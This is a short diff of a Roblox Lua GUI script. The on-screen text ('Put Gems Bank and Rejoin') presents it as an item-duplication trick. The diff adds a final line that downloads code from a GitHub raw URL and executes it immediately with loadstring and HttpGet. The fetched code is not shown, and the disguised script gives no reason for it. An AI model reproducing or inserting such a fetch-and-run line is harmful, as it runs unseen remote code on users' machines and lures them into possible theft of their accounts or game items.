@@ -47,3 +47,5 @@ _30Minutes.Font = Enum.Font.SourceSans
 _30Minutes.Text = "Put Gems Bank and Rejoin"
 _30Minutes.TextColor3 = Color3.fromRGB(255, 255, 255)
 _30Minutes.TextSize = 23.000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mikoks21/DUPEgifts/main/ExclusiveHugeGistEgg"))()
